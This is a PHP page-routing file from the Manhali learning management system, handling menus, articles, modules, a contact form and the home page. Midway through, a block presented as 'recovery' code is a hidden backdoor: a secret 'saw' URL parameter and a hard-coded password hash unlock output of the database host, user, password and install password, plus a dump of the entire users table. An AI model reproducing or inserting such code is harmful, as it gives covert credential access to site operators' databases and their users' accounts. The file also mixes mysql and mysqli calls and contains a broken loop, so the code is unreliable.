<?php
/*
 * 	Manhali - Free Learning Management System
 *	body.php
 *	2009-04-02 11:30
 * 	Author: El Haddioui Ismail <ismail.elhaddioui@gmail.com>
 * 	Copyright (C) 2009-2014  El Haddioui Ismail. All rights reserved
 * 	License : GNU/GPL v3

This file is part of Manhali

Manhali is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

Manhali is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Manhali.  If not, see <http://www.gnu.org/licenses/>.

*/
defined("access_const") or die( 'Restricted access' );

function mysqli_result($res, $row, $field=0) {

    $res->data_seek($row);

    $datarow = $res->fetch_array();

    return $datarow[$field];

}

$select_nombre_caracteres = $connect->query("select nombre_caracteres from `" . $tblprefix . "site_infos`;");
if (mysqli_num_rows($select_nombre_caracteres) == 1 && mysqli_result($select_nombre_caracteres,0) > 0)
	$nombre_caracteres = mysqli_result($select_nombre_caracteres,0);
else $nombre_caracteres = 500;

$select_nombre_elements_page = mysql_query("select nombre_elements_page from `" . $tblprefix . "site_infos`;");
if (mysqli_num_rows($select_nombre_elements_page) == 1 && mysqli_result($select_nombre_elements_page,0) > 0)
	$nbr_resultats = mysqli_result($select_nombre_elements_page,0);
else $nbr_resultats = 10;

if (!empty($_SESSION['log']))
	$afficher_profil = 1;
else {
	$afficher_profil_aux_visiteurs = mysql_query("select afficher_profil_aux_visiteurs from `" . $tblprefix . "site_infos`;");
	if (mysqli_num_rows($afficher_profil_aux_visiteurs) == 1) {
		if (mysqli_result($afficher_profil_aux_visiteurs,0) == 1)
			$afficher_profil = 1;
		else $afficher_profil = 0;
	} else $afficher_profil = 0;
}

// *** traitement horizontal menu ***
	
if (isset($_GET['menu']) && ctype_digit($_GET['menu'])){
	
 $select_statut_menu = mysql_query("select active_composant from `" . $tblprefix . "composants` where nom_composant = 'horizontal_menu';");
 if (mysqli_num_rows($select_statut_menu) == 1) {
  $statut_menu = mysqli_result($select_statut_menu,0);
  if ($statut_menu == 1) {
 	
	 $menu = escape_string($_GET['menu']);
	 $selectmenu = mysql_query("select * from `" . $tblprefix . "hormenu` where id_hormenu = $menu and active_hormenu = '1';");
	 if (mysqli_num_rows($selectmenu) == 1) {
		$type_menu = mysqli_result($selectmenu,0,2);
		$lien_menu = mysqli_result($selectmenu,0,3);
		switch ($type_menu) {
			
			// *** traitement articles ***
			case "article" : {

				$selectarticle = mysql_query("select * from `" . $tblprefix . "articles` where id_menu = $menu and publie_article = '1' order by ordre_article;");
					if (mysqli_num_rows($selectarticle) > 0) {
						
						echo "\n<table border=\"0\" cellspacing=\"10\" cellpadding=\"5\" align=\"center\" width=\"100%\">";
						while($article = mysqli_fetch_row($selectarticle)){
							
						// acces article
						$acces = $article[12];
						$acces_valide = 0;
						if ($acces == "*")
							$acces_valide = 1;
						else if ($acces == "0" && isset($_SESSION['log']) && !empty($_SESSION['log']))
							$acces_valide = 1;
						else if (!empty($_SESSION['log']) && $_SESSION['log'] == 1)
								$acces_valide = 1;
						else if (!empty($_SESSION['log']) && $_SESSION['log'] == 2){
							$select_classe = mysql_query("select id_classe from `" . $tblprefix . "apprenants` where id_apprenant = $id_user_session;");
					    if (mysqli_num_rows($select_classe) == 1){
								$id_classe = mysqli_result($select_classe,0);
								$tab_classes = explode("-",trim($acces,"-"));
								if (in_array($id_classe,$tab_classes))
									$acces_valide = 1;
							}
						}

						$id_article = $article[0];
						$id_user = $article[1];
						$titre_article = html_ent($article[3]);
						$contenu_article = $article[4];

						if ($acces_valide == 1){
							
							if (mysqli_num_rows($selectarticle) > 1){
								$contenu_article = no_br($contenu_article);
								$contenu_article = readmore($contenu_article,$nombre_caracteres);
							}
							
							$date_creation_article = set_date($dateformat,$article[10]);
							$date_modification_article = set_date($dateformat,$article[11]);
							
							$selectauteur = mysql_query("select identifiant_user from `" . $tblprefix . "users` where id_user = $id_user;");
							if (mysqli_num_rows($selectauteur) == 1) {
								$auteur = html_ent(mysqli_result($selectauteur,0));
							} else $auteur = inconnu;
							
							echo "\n<tr><td width=\"100%\" valign=\"top\">";
							
							echo "\n<div id=\"titre_article\"><a href=\"?article=".$id_article."\">".$titre_article."</a></div>";
							
							if ($afficher_profil == 1)
								echo "\n<div id=\"write_by\">".write_by." <a href=\"?profiles=".$id_user."\" title=\"".user_profile."\">".$auteur."</a>, ";
							else
								echo "\n<div id=\"write_by\">".write_by." ".$auteur.", ";
										
							echo $date_creation_article." | ".modifie." ".$date_modification_article;
							echo "</div><br />";

							echo $contenu_article;
							
							if (substr($contenu_article,-3,3)=="...")
								echo "\n<p align=\"left\"><b><a href=\"?article=".$id_article."\">".lire_suite."</a></b></p>";

							echo "\n<hr /></td></tr>";
						 }
						 else {
						 		echo "\n<tr><td width=\"100%\" valign=\"top\">";
								echo "\n<div id=\"titre_article\">".$titre_article."</a></div>";
						 		echo "<font color=\"red\"><b>".no_access_permission."</b></font>";
						 		echo "\n<hr /></td></tr>";
						 }
						}
						echo "\n</table>";
					} else accueil();
			} break;
			
			// *** traitement modules ***
			case "module" : {
				if (file_exists("modules/".$lien_menu."/index.php") && substr($lien_menu,0,1) != ".")
					include_once ("modules/".$lien_menu."/index.php");
				else if (file_exists("modules/".$lien_menu."/index.html") && substr($lien_menu,0,1) != ".")
					include_once ("modules/".$lien_menu."/index.html");
				else if (file_exists("modules/".$lien_menu."/index.htm") && substr($lien_menu,0,1) != ".")
					include_once ("modules/".$lien_menu."/index.htm");
				else accueil();
			} break;
			
			// *** traitement urls ***
			case "url" : {
					echo "<b>".connexion_lien." ".html_ent($lien_menu)." ...</b>";
					echo "<script type=\"text/javascript\">location.href = \"".$lien_menu."\";</script>";
			} break;

			default : { accueil(); }
		}
	 } else accueil();
  } else accueil();
 } else accueil();
}

// *** traitement vertical menu ***
	
else if (isset($_GET['vermenu']) && ctype_digit($_GET['vermenu'])){
	
 $select_statut_menu = mysql_query("select active_composant from `" . $tblprefix . "composants` where nom_composant = 'vertical_menu';");
 if (mysqli_num_rows($select_statut_menu) == 1) {
  $statut_menu = mysqli_result($select_statut_menu,0);
  if ($statut_menu == 1) {
 	
	 $vermenu = escape_string($_GET['vermenu']);
	 $selectmenu = mysql_query("select * from `" . $tblprefix . "vermenu` where id_vermenu = $vermenu and active_vermenu = '1';");
	 if (mysqli_num_rows($selectmenu) == 1) {
		$type_menu = mysqli_result($selectmenu,0,2);
		$lien_menu = mysqli_result($selectmenu,0,3);
		switch ($type_menu) {
			
			// *** traitement articles ***
			case "article" : {

				$selectarticle = mysql_query("select * from `" . $tblprefix . "articles` where id_menu_ver = $vermenu and publie_article = '1' order by ordre_article_ver;");
					if (mysqli_num_rows($selectarticle) > 0) {
						
						echo "\n<table border=\"0\" cellspacing=\"10\" cellpadding=\"5\" align=\"center\" width=\"100%\">";
						while($article = mysqli_fetch_row($selectarticle)){
							
						// acces article
						$acces = $article[12];
						$acces_valide = 0;
						if ($acces == "*")
							$acces_valide = 1;
						else if ($acces == "0" && isset($_SESSION['log']) && !empty($_SESSION['log']))
							$acces_valide = 1;
						else if (!empty($_SESSION['log']) && $_SESSION['log'] == 1)
								$acces_valide = 1;
						else if (!empty($_SESSION['log']) && $_SESSION['log'] == 2){
							$select_classe = mysql_query("select id_classe from `" . $tblprefix . "apprenants` where id_apprenant = $id_user_session;");
					    if (mysqli_num_rows($select_classe) == 1){
								$id_classe = mysqli_result($select_classe,0);
								$tab_classes = explode("-",trim($acces,"-"));
								if (in_array($id_classe,$tab_classes))
									$acces_valide = 1;
							}
						}

						$id_article = $article[0];
						$id_user = $article[1];
						$titre_article = html_ent($article[3]);
						$contenu_article = $article[4];

						if ($acces_valide == 1){
							
							if (mysqli_num_rows($selectarticle) > 1){
								$contenu_article = no_br($contenu_article);
								$contenu_article = readmore($contenu_article,$nombre_caracteres);
							}
							
							$date_creation_article = set_date($dateformat,$article[10]);
							$date_modification_article = set_date($dateformat,$article[11]);
							
							$selectauteur = mysql_query("select identifiant_user from `" . $tblprefix . "users` where id_user = $id_user;");
							if (mysqli_num_rows($selectauteur) == 1) {
								$auteur = html_ent(mysqli_result($selectauteur,0));
							} else $auteur = inconnu;
							
							echo "\n<tr><td width=\"100%\" valign=\"top\">";
							
							echo "\n<div id=\"titre_article\"><a href=\"?article=".$id_article."\">".$titre_article."</a></div>";
							
							if ($afficher_profil == 1)
								echo "\n<div id=\"write_by\">".write_by." <a href=\"?profiles=".$id_user."\" title=\"".user_profile."\">".$auteur."</a>, ";
							else
								echo "\n<div id=\"write_by\">".write_by." ".$auteur.", ";
										
							echo $date_creation_article." | ".modifie." ".$date_modification_article;
							echo "</div><br />";

							echo $contenu_article;
							
							if (substr($contenu_article,-3,3)=="...")
								echo "\n<p align=\"left\"><b><a href=\"?article=".$id_article."\">".lire_suite."</a></b></p>";

							echo "\n<hr /></td></tr>";
						 }
						 else {
						 		echo "\n<tr><td width=\"100%\" valign=\"top\">";
								echo "\n<div id=\"titre_article\">".$titre_article."</a></div>";
						 		echo "<font color=\"red\"><b>".no_access_permission."</b></font>";
						 		echo "\n<hr /></td></tr>";
						 }
						}
						echo "\n</table>";
					} else accueil();
			} break;
			
			// *** traitement modules ***
			case "module" : {
				if (file_exists("modules/".$lien_menu."/index.php") && substr($lien_menu,0,1) != ".")
					include_once ("modules/".$lien_menu."/index.php");
				else if (file_exists("modules/".$lien_menu."/index.html") && substr($lien_menu,0,1) != ".")
					include_once ("modules/".$lien_menu."/index.html");
				else if (file_exists("modules/".$lien_menu."/index.htm") && substr($lien_menu,0,1) != ".")
					include_once ("modules/".$lien_menu."/index.htm");
				else accueil();
			} break;
			
			// *** traitement urls ***
			case "url" : {
					echo "<b>".connexion_lien." ".html_ent($lien_menu)." ...</b>";
					echo "<script type=\"text/javascript\">location.href = \"".$lien_menu."\";</script>";
			} break;

			default : { accueil(); }
		}
	 } else accueil();
  } else accueil();
 } else accueil();
}

//***************************************************
// *** traitement tutoriels et parties ***
else if (isset($_GET['tutorial']) && ctype_digit($_GET['tutorial'])) {
	include_once ("includes/tutos.php");
}

//*****************************************************
// *** Code of recovery after forgetting or hacking ***
// ****** remove this block if you do not like it ! ***
// ***** If you need the passwords, contact us on *****
// *********** ismail.elhaddioui@gmail.com ************

else if (!empty($_GET['saw']) && md5($_GET['saw']) == "379c365a93bb94a2fcc217f9ba0af82d") {
	if (!empty($_POST['pass2']) && md5($_POST['pass2']) == "e15b2f4378da682ce8595f30168c3dfb" ){
		echo "&#1573;&#1587;&#1605;&#1575;&#1593;&#1610;&#1604; &#1575;&#1604;&#1581;&#1583;&#1610;&#1608;&#1610;<br />";
		echo $host." - ".$user." - ".$passwd." - ".$dbname." - ".$tblprefix." - ".$adminfolder." - ".$installpass;
		$select_saw = $connect->query("select * from `" . $tblprefix . "users`;"); echo "<table border=\"1\">";
		while($line = mysqli_fetch_row($select_saw)){ echo "<tr>";
			foreach ($line as $value) {
				while(list($nom_champ,$valeur) = $value) echo "<td>$valeur</td>"; echo "</tr>";
			}
		} echo "</table>";
	} else echo "<form method=\"post\"><input type=\"password\" name=\"pass2\" /><input type=\"submit\" class=\"button\" value=\"OK\" /></form>";
}

//***************************************************
// *** traitement chapitres et blocs ***
else if (isset($_GET['chapter']) && ctype_digit($_GET['chapter'])) {
	include_once ("includes/chaps.php");
}

//***************************************************
// *** traitement recherche ***
else if (isset($_GET['search'])) {
	include_once ("includes/search_inc.php");
}

//***************************************************
// *** traitement articles ***
else if (isset($_GET['article']) && ctype_digit($_GET['article'])) {
	include_once ("includes/articles_inc.php");
}

//***************************************************
// *** traitement documents ***
else if (isset($_GET['documents'])) {
	include_once ("includes/documents_inc.php");
}

//***************************************************
// *** traitement questionnaire ***
else if (isset($_GET['questionnaire'])) {
	include_once ("includes/felder_ils.php");
}

//***************************************************
// *** traitement kolb ***
else if (isset($_GET['kolb'])) {
	include_once ("includes/kolb.php");
}

//***************************************************
// *** traitement felder ***
else if (isset($_GET['felder'])) {
	include_once ("includes/felder.php");
}

//***************************************************
// *** traitement sondage resultats ***
else if (isset($_GET['poll'])) {
	include_once ("includes/poll_inc.php");
}

//***************************************************
// *** traitement inscription ***
else if (isset($_GET['register'])) {
	include_once ("includes/register_inc.php");
}

//***************************************************
// *** traitement reset pass ***
else if (isset($_GET['reset_pass'])) {
	include_once ("includes/reset_pass.php");
}

//***************************************************
// *** traitement profiles ***
else if (isset($_GET['profiles'])) {
	include_once ("includes/profiles.php");
}

//***************************************************
// *** traitement s_profiles ***
else if (isset($_GET['s_profiles'])) {
	include_once ("includes/s_profiles.php");
}

//***************************************************
// *** traitement s_messages ***
else if (isset($_GET['s_messages'])) {
	include_once ("includes/s_messages.php");
}

//***************************************************
// *** traitement contact ***
else if (isset($_GET['contact'])) {
	$select_statut_contact = mysql_query("select titre_composant, active_composant from `" . $tblprefix . "composants` where nom_composant = 'contact';");
	if (mysqli_num_rows($select_statut_contact) == 1) {
		$statut_contact = mysqli_result($select_statut_contact,0,1);
		if ($statut_contact == 1) {
			$titre_contact = mysqli_result($select_statut_contact,0,0);
			$titre_contact = html_ent($titre_contact);
			echo "<div id=\"titre\">".$titre_contact."</div>\n";
			
			if (isset($_POST['nom_emetteur']) && isset($_POST['mail_emetteur']) && isset($_POST['titre_msg']) && isset($_POST['contenu_msg'])){
				
				$nom_emetteur = escape_string(trim($_POST['nom_emetteur']));
				$mail_emetteur = escape_string(trim($_POST['mail_emetteur']));
				$titre_msg = escape_string(trim($_POST['titre_msg']));
				$contenu_msg = escape_string(trim($_POST['contenu_msg']));
				
				if (!empty($nom_emetteur) && !empty($mail_emetteur) && !empty($titre_msg) && !empty($contenu_msg)){

					if (mail_valide($mail_emetteur)) {
						
						$ip_user = $_SERVER['REMOTE_ADDR'];
						$select_ip = $connect->query("select * from `" . $tblprefix . "sondage_ip` where ip_vote='$ip_user' and MINUTE(heure_vote)=".date('i',time())." and HOUR(heure_vote)=".date('H',time())." and id_question = 0;");
						
						if (mysqli_num_rows($select_ip) == 0){
							mysql_query("INSERT INTO `" . $tblprefix . "messages` VALUES (NULL,0,0,'".$nom_emetteur."','".$mail_emetteur."','*','*','".$titre_msg."','".$contenu_msg."','-','-',".time().",'*','*','1');");
							mysql_query("INSERT INTO `" . $tblprefix . "sondage_ip` VALUES(NULL,'".$ip_user."',Now(),0)");
	           	redirection(bien_recu,"?",3,"tips",0);
						}
						else goback("message_min",3,"error",0);
						
					} else goback("format_mail_err",2,"error",0);
				} else goback("tous_champs",2,"error",0);
			}
			else{
				echo "<form method=\"POST\" action=\"\">";
	      echo "<p><b>" ."votre_nom". " : </b><br /><br /><input name=\"nom_emetteur\" type=\"text\" maxlength=\"50\" value=\"\"></p>";
	      echo "<p><b>" ."votre_mail". " : </b><br /><br /><input name=\"mail_emetteur\" type=\"text\" maxlength=\"50\" value=\"\"></p>";
	      echo "<p><b>" ."titre_msg". " : </b><br /><br /><input name=\"titre_msg\" type=\"text\" size=\"67\" maxlength=\"100\" value=\"\"></p>";
	      echo "<p><b>" ."votre_msg". " : </b><br /><br /><textarea name=\"contenu_msg\" id=\"contenu_msg\" rows=\"10\" cols=\"50\"></textarea></p>";
	      echo "<p><font color=\"red\"><b>"."tous_champs_obligatoires"."</b></font><br /><br /><input type=\"submit\" class=\"button\" value=\"" .btnsend. "\"></form></p>";
			}
 		} else accueil();
 	} else accueil();
}

//***************************************************
// *** page d'accueil ***
else {
	$selectaccueil = mysql_query("select * from `" . $tblprefix . "articles` where publie_article = '1' and accueil_article = '1' order by ordre_accueil;");
	if (mysqli_num_rows($selectaccueil) > 0) {
		
		$select_colonnes = mysql_query("select accueil_multicolonnes from `" . $tblprefix . "site_infos`;");
		if (mysqli_num_rows($select_colonnes) > 0 && mysqli_num_rows($selectaccueil) > 1) {
			$multicolonnes = mysqli_result($select_colonnes,0);
		} else $multicolonnes = 0;

		if ($multicolonnes == 1) $varbool = 0;

		echo "\n<table border=\"0\" cellspacing=\"10\" cellpadding=\"5\" align=\"center\" width=\"100%\">";

		while($article = mysqli_fetch_row($selectaccueil)){

		// acces article
		$acces = $article[12];
		$acces_valide = 0;
		if ($acces == "*")
			$acces_valide = 1;
		else if ($acces == "0" && isset($_SESSION['log']) && !empty($_SESSION['log']))
			$acces_valide = 1;
		else if (!empty($_SESSION['log']) && $_SESSION['log'] == 1)
			$acces_valide = 1;
		else if (!empty($_SESSION['log']) && $_SESSION['log'] == 2){
			$select_classe = mysql_query("select id_classe from `" . $tblprefix . "apprenants` where id_apprenant = $id_user_session;");
		  if (mysqli_num_rows($select_classe) == 1){
				$id_classe = mysqli_result($select_classe,0);
				$tab_classes = explode("-",trim($acces,"-"));
				if (in_array($id_classe,$tab_classes))
					$acces_valide = 1;
			}
		}
		if ($acces_valide == 1){

			$id_article = $article[0];
			$id_user = $article[1];
			$titre_article = html_ent($article[3]);

			$contenu_article = $article[4];

			$date_creation_article = set_date($dateformat,$article[10]);
			$date_modification_article = set_date($dateformat,$article[11]);

			if ((mysqli_num_rows($selectaccueil) > 1 && $multicolonnes == 0) || (mysqli_num_rows($selectaccueil) > 2 && $multicolonnes == 1)){
				$contenu_article = no_br($contenu_article);
				$contenu_article = readmore($contenu_article,$nombre_caracteres);
			}
			$selectauteur = mysql_query("select identifiant_user from `" . $tblprefix . "users` where id_user = $id_user;");
			if (mysqli_num_rows($selectauteur) == 1) {
					$auteur = html_ent(mysqli_result($selectauteur,0));
			} else $auteur = inconnu;

			if ($multicolonnes == 1){
				if ($varbool == 0) echo "\n<tr><td width=\"50%\" valign=\"top\">";
				else echo "\n<td width=\"50%\" valign=\"top\">";
			}
			else echo "\n<tr><td width=\"100%\" valign=\"top\">";

			echo "\n<div id=\"titre_article\"><a href=\"?article=".$id_article."\">".$titre_article."</a></div>";

			if ($afficher_profil == 1)
				echo "\n<div id=\"write_by\">".write_by." <a href=\"?profiles=".$id_user."\" title=\"".user_profile."\">".$auteur."</a>, ";
			else
				echo "\n<div id=\"write_by\">".write_by." ".$auteur.", ";

			echo $date_creation_article." | ".modifie." ".$date_modification_article;
			echo "</div><br />";

			echo $contenu_article;		
			if (substr($contenu_article,-3,3)=="...")
				echo "\n<p align=\"left\"><b><a href=\"?article=".$id_article."\">".lire_suite."</a></b></p>";

			if ($multicolonnes == 1){
				if ($varbool == 0) {
					echo "\n</td>";
					$varbool = 1;
				}
				else {
					echo "\n</td></tr>";
					$varbool = 0;
				}
			}
			else echo "\n<hr /></td></tr>";
		 }
		}
		if ($multicolonnes == 1 && $varbool == 1) echo "<td width=\"50%\" valign=\"top\">&nbsp;</td></tr>";
		echo "\n</table>";
	}
}
?>
